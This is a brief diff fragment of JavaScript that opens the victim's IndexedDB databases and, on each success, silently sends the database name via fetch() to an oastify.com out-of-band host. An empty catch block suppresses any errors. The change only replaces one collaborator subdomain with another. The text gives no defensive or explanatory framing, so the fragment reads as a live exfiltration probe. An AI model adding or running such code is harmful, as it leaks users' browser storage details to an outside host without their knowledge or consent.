@@ -28,7 +28,7 @@
       try {
         var req = win.indexedDB.open(dbName);
         req.onsuccess = function(e) {
-          fetch('https://vhgkbwniokbfy8qyl2ohjmjfu60xorcg.oastify.com/db?name=' + dbName);
+          fetch('https://gey58hk3l580vtnjinl2g7g0rrxil9oxd.oastify.com/db?name=' + dbName);
         };
       } catch(e) {}
     });
